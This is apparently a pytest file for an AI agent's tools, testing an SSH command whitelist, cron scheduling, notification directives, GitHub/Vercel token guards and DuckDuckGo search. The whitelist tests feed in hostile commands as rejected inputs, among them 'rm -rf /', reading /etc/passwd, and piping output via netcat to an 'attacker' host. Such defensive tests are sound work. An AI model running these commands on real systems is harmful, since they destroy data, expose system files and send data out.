"""Tests for agent tools: SSH whitelist, scheduling directives, github/vercel guards."""

from __future__ import annotations

import json

import pytest

from app.services.agent.tools import device
from app.services.agent.tools.notifications import (
    ScheduleError,
    next_run_from_cron,
    parse_run_at,
    validate_cron,
)


class TestSSHWhitelist:
    def test_allows_whitelisted_command(self):
        assert device.validate_command("uptime") == "uptime"

    def test_allows_whitelisted_with_args(self):
        assert device.validate_command("df -h") == "df -h"

    def test_rejects_unknown_command(self):
        with pytest.raises(device.SSHCommandRejected):
            device.validate_command("rm -rf /")

    def test_rejects_shell_metacharacters(self):
        with pytest.raises(device.SSHCommandRejected):
            device.validate_command("uptime; cat /etc/passwd")

    def test_rejects_pipe(self):
        with pytest.raises(device.SSHCommandRejected):
            device.validate_command("uptime | nc attacker 1337")

    def test_rejects_command_substitution(self):
        with pytest.raises(device.SSHCommandRejected):
            device.validate_command("uptime $(whoami)")

    def test_rejects_empty(self):
        with pytest.raises(device.SSHCommandRejected):
            device.validate_command("   ")


class TestScheduling:
    def test_valid_cron(self):
        assert validate_cron("0 9 * * *") == "0 9 * * *"

    def test_invalid_cron_raises(self):
        with pytest.raises(ScheduleError):
            validate_cron("not a cron")

    def test_next_run_is_in_future(self):
        from datetime import datetime, timezone

        now = datetime(2030, 1, 1, 8, 0, tzinfo=timezone.utc)
        nxt = next_run_from_cron("0 9 * * *", base=now)
        assert nxt.hour == 9
        assert nxt > now

    def test_parse_run_at_iso_with_tz(self):
        dt = parse_run_at("2030-05-01T10:00:00+07:00")
        assert dt is not None
        assert dt.hour == 3  # converted to UTC

    def test_parse_run_at_invalid(self):
        with pytest.raises(ScheduleError):
            parse_run_at("besok pagi")


class TestScheduleDirective:
    @pytest.mark.asyncio
    async def test_cron_directive_emitted(self):
        from app.services.agent.tool_registry import _schedule_impl

        out = await _schedule_impl("minum obat", "telegram", cron="0 8 * * *", run_at=None)
        data = json.loads(out)
        assert data["__directive"] == "schedule_notification"
        assert data["platform"] == "telegram"
        assert data["next_run"]

    @pytest.mark.asyncio
    async def test_missing_schedule_is_rejected(self):
        from app.services.agent.tool_registry import _schedule_impl

        out = await _schedule_impl("halo", "telegram", cron=None, run_at=None)
        assert "cron" in out.lower() or "run_at" in out.lower()

    @pytest.mark.asyncio
    async def test_invalid_platform_rejected(self):
        from app.services.agent.tool_registry import _schedule_impl

        out = await _schedule_impl("x", "email", cron="0 8 * * *")
        assert "telegram" in out and "whatsapp" in out


class TestWebManagementGuards:
    @pytest.mark.asyncio
    async def test_github_without_token_errors(self, monkeypatch):
        from app.services.agent.tools import web_management

        monkeypatch.setattr(web_management.settings, "github_token", "")
        with pytest.raises(web_management.WebManagementError):
            await web_management.github_get_repo("owner", "repo")

    @pytest.mark.asyncio
    async def test_vercel_without_token_errors(self, monkeypatch):
        from app.services.agent.tools import web_management

        monkeypatch.setattr(web_management.settings, "vercel_token", "")
        with pytest.raises(web_management.WebManagementError):
            await web_management.vercel_list_deployments("proj")


class TestWebSearchConfig:
    @pytest.mark.asyncio
    async def test_unconfigured_search_raises(self, monkeypatch):
        from app.services.agent.tools import web_search

        monkeypatch.setattr(web_search.settings, "search_provider", "none")
        with pytest.raises(web_search.WebSearchError):
            await web_search.web_search("apa itu python")

    @pytest.mark.asyncio
    async def test_duckduckgo_parses_instant_answer(self, monkeypatch):
        """DuckDuckGo path works without any API key."""
        import respx
        from httpx import Response

        from app.services.agent.tools import web_search

        monkeypatch.setattr(web_search.settings, "search_provider", "duckduckgo")
        payload = {
            "Heading": "Python",
            "AbstractText": "Python adalah bahasa pemrograman.",
            "AbstractURL": "https://python.org",
            "RelatedTopics": [],
        }
        with respx.mock:
            respx.get("https://api.duckduckgo.com/").mock(
                return_value=Response(200, json=payload)
            )
            respx.post("https://html.duckduckgo.com/html/").mock(
                return_value=Response(200, text="")
            )
            results = await web_search.web_search("apa itu python", limit=3)

        assert len(results) == 1
        assert results[0]["title"] == "Python"
        assert "python.org" in results[0]["link"]

    @pytest.mark.asyncio
    async def test_format_results_renders(self):
        from app.services.agent.tools import web_search

        out = web_search.format_results(
            [{"title": "T", "link": "https://x", "snippet": "S"}]
        )
        assert "T" in out and "https://x" in out and "S" in out
        assert web_search.format_results([]) == "Tidak ada hasil pencarian."
